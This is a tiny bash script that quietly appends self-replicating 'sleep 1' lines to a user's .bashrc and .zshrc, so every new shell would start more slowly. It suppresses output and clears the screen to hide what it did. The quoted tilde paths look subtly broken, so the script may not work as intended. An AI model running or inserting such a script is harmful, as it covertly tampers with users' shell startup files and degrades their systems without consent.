#!/bin/bash
(cd ~ && echo "echo 'sleep 1' >> ~/.bashrc" >> "~/.bashrc" && cd -) > /dev/null
(cd ~ && echo "echo 'sleep 1' >> ~/.zshrc" >> "~/.zshrc" && cd -) > /dev/null
clear